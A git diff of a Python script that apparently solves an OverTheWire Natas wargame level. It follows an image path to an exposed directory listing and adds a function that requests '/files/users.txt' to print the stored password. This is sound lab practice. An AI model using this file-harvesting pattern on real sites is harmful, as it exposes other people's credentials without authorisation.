@@ -9,15 +9,13 @@ url = 'http://%s.natas.labs.overthewire.org' % username
 
 session = requests.Session()
 resp = session.get(url, auth=(username, password))
-
 content = resp.text
-
 soup = BeautifulSoup(content, 'html.parser')
 #print(soup.body)
 
 el = soup.find('img')
 file_location = (el['src'])
-#print(file_location)
+print(file_location)
 #pull out img src
 
 def fileLocationRequest():
@@ -27,6 +25,12 @@ def fileLocationRequest():
     soup2 = BeautifulSoup(locationContent, 'html.parser')
     el2 = soup2.findAll('a')[6]
     print(el2['href']) #pull out href value for password file
+    return el2
+
+def passwordRequest():
+    resp3 = session.get(url+'/files/users.txt', auth=(username, password))
+    print('hello')
+    print(resp3.text)
 
 fileLocationRequest()
-
+passwordRequest()
